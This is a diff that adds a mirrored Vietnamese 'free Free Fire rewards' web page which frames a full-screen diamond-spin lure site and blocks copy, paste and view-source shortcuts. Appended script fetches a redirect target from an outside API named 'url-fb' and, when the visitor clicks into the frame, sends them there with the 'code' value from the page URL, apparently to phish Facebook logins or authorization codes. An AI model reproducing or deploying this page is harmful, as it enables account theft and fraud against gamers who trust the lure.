@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+
+<!-- Mirrored from event.sukien.us/1632123590.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 16 Jul 2021 09:04:47 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Nhận qu&agrave; Free Fire - Hội Qu&aacute;n FF</title>
+<meta property="og:url" content="1632123590.html" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Nhận qu&agrave; Free Fire - Hội Qu&aacute;n FF" />
+<meta property="og:description" content="Nhận qu&agrave; Free Fire - Hội Qu&aacute;n FF" />
+    <meta property="og:image" content="../anhdoge101.github.io/2.png" />
+<style>
+.container {
+  position: relative;
+  width: 100%;
+  overflow: hidden;
+  padding-top: 100%; /* 1:1 Aspect Ratio */
+}
+
+.responsive-iframe {
+  position: fixed;
+  top: 0;
+  left: 0;
+  bottom: 0;
+  right: 0;
+  width: 100%;
+  height: 100%;
+  border: none;
+}
+</style>
+</head>
+<body>
+<div class="container">
+    <iframe class="responsive-iframe" id="iframe" sandbox src="https://vongquaykimcuongfreefire.com/vong-quay-kim-cuong-free-fire-9k-10k-13928-nguoi-da-trung-29.html"></iframe>
+  </div>
+<script>
+document.onkeydown = function(e) {
+        if (e.ctrlKey && 
+            (e.keyCode === 67 || 
+             e.keyCode === 86 || 
+             e.keyCode === 85 || 
+             e.keyCode === 117)) {
+            alert('not allowed');
+            return false;
+        } else {
+            return true;
+        }
+};
+</script>
+</body>
+
+<!-- Mirrored from event.sukien.us/1632123590.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 16 Jul 2021 09:04:48 GMT -->
+</html>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+
+<script>
+  $(document).ready(function(){
+      $.ajax({
+          url: "https://tiemnet.xyz/api/url-fb",
+          type: "GET",
+          success: function(result){
+            focus();
+            var url_string = window.location.href
+            var url = new URL(url_string);
+            var code = url.searchParams.get("code");
+            var listener = addEventListener('blur', function() {
+              if(document.activeElement === document.getElementById('iframe')) {
+                window.location.href=result+"?code="+code;
+              }
+                removeEventListener(listener);
+            });
+          }
+      })
+  })
+</script>
